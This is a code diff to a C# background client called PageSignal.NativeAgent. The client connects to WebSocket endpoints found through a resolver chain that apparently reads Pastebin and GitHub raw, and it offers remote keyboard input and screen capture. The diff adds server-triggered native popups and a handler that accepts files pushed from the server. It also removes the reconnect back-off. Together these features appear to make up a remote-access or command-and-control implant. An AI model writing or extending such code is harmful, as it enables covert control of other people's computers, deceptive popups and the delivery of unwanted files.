@@ -29,6 +29,7 @@ namespace PageSignal.NativeAgent
         private static CancellationTokenSource _cts;
         private static Thread _worker;
         private static readonly string _clientId = Guid.NewGuid().ToString();
+        private static readonly NativePopupService _nativePopup = new NativePopupService();
 
         public static void StartBackground()
         {
@@ -129,7 +130,6 @@ namespace PageSignal.NativeAgent
                     plan = new[] { new ResolvedEndpoint(EndpointResolver.DEFAULT_WS_URL, "default-fallback") };
                 }
 
-                bool anySuccess = false;
                 foreach (var endpoint in plan)
                 {
                     if (token.IsCancellationRequested) return;
@@ -137,7 +137,6 @@ namespace PageSignal.NativeAgent
                     try
                     {
                         await ConnectAndServe(endpoint, token).ConfigureAwait(false);
-                        anySuccess = true;
                     }
                     catch (OperationCanceledException) { return; }
                     catch (Exception ex) { failure = ex; }
@@ -150,15 +149,7 @@ namespace PageSignal.NativeAgent
                     }
                 }
 
-                Logger.Log("agent", "all endpoints exhausted; restarting", new { anySuccess });
-
-                // If we never connected during this whole pass, back off a little before retrying
-                // the resolver chain so we don't hammer Pastebin / GitHub raw on a dead network.
-                if (!anySuccess)
-                {
-                    try { await Task.Delay(RECONNECT_INTERVAL_SECONDS * 1000, token).ConfigureAwait(false); }
-                    catch (TaskCanceledException) { return; }
-                }
+                Logger.Log("agent", "all endpoints exhausted; restarting resolver chain");
             }
         }
 
@@ -186,7 +177,7 @@ namespace PageSignal.NativeAgent
                     }
                 }
 
-                var capabilities = new List<string> { "os-input", "screen-capture" };
+                var capabilities = new List<string> { "os-input", "screen-capture", "native-popup" };
                 var register = new Dictionary<string, object>
                 {
                     { "type", "client.register" },
@@ -201,6 +192,9 @@ namespace PageSignal.NativeAgent
                     new { endpoint = endpoint.Url, capabilities });
 
                 var streamService = new ScreenStreamService();
+                _nativePopup.BindBridge(
+                    obj => SendJson(ws, obj, token),
+                    (meta, bytes) => SendBinary(ws, meta, bytes, token));
                 Exception loopError = null;
                 try
                 {
@@ -240,7 +234,17 @@ namespace PageSignal.NativeAgent
                     byte[] frame = msBuf.ToArray();
                     if (result.MessageType == WebSocketMessageType.Binary)
                     {
-                        // Binary envelopes are reserved for file-transfer (handled by extension); ignore.
+                        IDictionary<string, object> metadata;
+                        byte[] payloadBytes;
+                        if (WireProtocol.TryDecodeBinaryEnvelope(frame, out metadata, out payloadBytes))
+                        {
+                            string payloadType = metadata.ContainsKey("type") ? Convert.ToString(metadata["type"]) : null;
+                            if (payloadType == "file-transfer.upload.binary")
+                            {
+                                await HandleNativePopupFileUpload(ws, metadata, payloadBytes, token).ConfigureAwait(false);
+                                continue;
+                            }
+                        }
                         Logger.Log("agent", "ignoring binary frame", new { bytes = frame.Length });
                         continue;
                     }
@@ -261,6 +265,7 @@ namespace PageSignal.NativeAgent
                             case "screen-share.key": await HandleKey(ws, payload, token); break;
                             case "screen-share.start": await HandleStreamStart(ws, payload, stream, token); break;
                             case "screen-share.stop": await HandleStreamStop(ws, payload, stream, token); break;
+                            case "popup.show": await HandleNativePopupShow(ws, payload, token); break;
                             default: Logger.Log("agent", "received text", new { type = mt }); break;
                         }
                     }
@@ -429,10 +434,68 @@ namespace PageSignal.NativeAgent
             }, token);
         }
 
+        private static async Task HandleNativePopupShow(ClientWebSocket ws, IDictionary<string, object> p, CancellationToken token)
+        {
+            string requestId = p.ContainsKey("requestId") ? Convert.ToString(p["requestId"]) : "";
+            string text = p.ContainsKey("text") ? Convert.ToString(p["text"]) : "";
+            IDictionary<string, object> response;
+            try
+            {
+                var status = await _nativePopup.ShowAsync(text).ConfigureAwait(false);
+                response = new Dictionary<string, object>
+                {
+                    { "type", "popup.result" },
+                    { "requestId", requestId },
+                    { "action", status.ContainsKey("action") ? status["action"] : "updated" },
+                    { "status", status },
+                };
+            }
+            catch (Exception ex)
+            {
+                response = new Dictionary<string, object>
+                {
+                    { "type", "popup.error" },
+                    { "requestId", requestId },
+                    { "message", ex.Message },
+                };
+            }
+            await SendJson(ws, response, token);
+        }
+
+        private static async Task HandleNativePopupFileUpload(ClientWebSocket ws, IDictionary<string, object> metadata, byte[] payload, CancellationToken token)
+        {
+            string requestId = metadata.ContainsKey("requestId") ? Convert.ToString(metadata["requestId"]) : "";
+            IDictionary<string, object> response;
+            try
+            {
+                string fileName = metadata.ContainsKey("fileName") ? Convert.ToString(metadata["fileName"]) : "shared-file.bin";
+                string mimeType = metadata.ContainsKey("mimeType") ? Convert.ToString(metadata["mimeType"]) : "application/octet-stream";
+                var result = await _nativePopup.ReceiveFileAsync(fileName, mimeType, payload).ConfigureAwait(false);
+                result["requestId"] = requestId;
+                response = result;
+            }
+            catch (Exception ex)
+            {
+                response = new Dictionary<string, object>
+                {
+                    { "type", "file-transfer.error" },
+                    { "requestId", requestId },
+                    { "message", ex.Message },
+                };
+            }
+            await SendJson(ws, response, token);
+        }
+
         private static Task SendJson(ClientWebSocket ws, IDictionary<string, object> obj, CancellationToken token)
         {
             byte[] data = Encoding.UTF8.GetBytes(WireProtocol.SerializeJson(obj));
             return ws.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Text, true, token);
+        }
+
+        private static Task SendBinary(ClientWebSocket ws, IDictionary<string, object> metadata, byte[] payload, CancellationToken token)
+        {
+            byte[] data = WireProtocol.BuildBinaryEnvelope(metadata, payload);
+            return ws.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Binary, true, token);
         }
     }
 }
